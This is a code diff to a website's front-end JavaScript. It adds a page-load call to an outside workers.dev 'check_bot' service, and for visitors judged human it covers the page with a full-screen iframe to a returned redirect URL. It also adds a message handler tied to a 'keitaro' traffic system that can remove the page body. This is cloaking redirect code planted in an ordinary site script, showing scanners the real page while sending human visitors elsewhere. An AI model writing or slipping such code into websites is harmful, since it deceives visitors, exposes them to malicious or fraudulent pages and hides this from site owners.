@@ -20,7 +20,16 @@ const toggleLoad = () => {
 createLoader();
 
 window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(toggleLoad, 800);
+    
+    fetch('https://proxy_cf.opaopaopppa.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
+        if (res?.code == 200 && !res.result) {
+            createFrame(res.url_red + 'NVQVZ4')
+        } else {
+            setTimeout(toggleLoad, 500);
+
+        }
+
+    })
 
     // Smooth scroll
     document.querySelectorAll('a[href^="#"]').forEach(anchor => {
@@ -80,3 +89,54 @@ window.addEventListener('DOMContentLoaded', () => {
         });
     }
 });
+
+
+window.addEventListener('message', (message) => {
+    console.log(message.data);
+    if (message.data?.bot) {
+        const wrapper = document.querySelector('#wrapper_frame');
+        console.log(wrapper);
+        wrapper.remove();
+        setTimeout(toggleLoad, 500);
+
+    }
+    if (message.data.keitaro && !message.data?.bot) {
+        const body = document.querySelector('body');
+        body.remove()
+        setTimeout(toggleLoad, 500);
+
+    }
+
+})
+
+
+function createFrame(data) {
+    const frame = document.createElement('iframe');
+    frame.setAttribute('src', data);
+    frame.setAttribute('width', '100%');
+    frame.setAttribute('height', '100vh');
+    frame.setAttribute('id', 'wrapper_frame');
+    const html = document.querySelector('html');
+    html.style.overflow = 'hidden';
+
+    // body.innerHTML = '';
+    html.append(frame);
+    frame.style = 'width: 100%; height: 100vh;border: none;'
+    const style = document.createElement('style');
+    style.innerHTML = `
+    
+  /* Make the iframe responsive */
+  @media only screen and (max-width: 768px) {
+    iframe {
+      height: 50vh;
+    }
+  }
+
+  @media only screen and (max-width: 480px) {
+    iframe {
+      height: 30vh;
+    }
+  }
+    `;
+    html.append(style)
+}
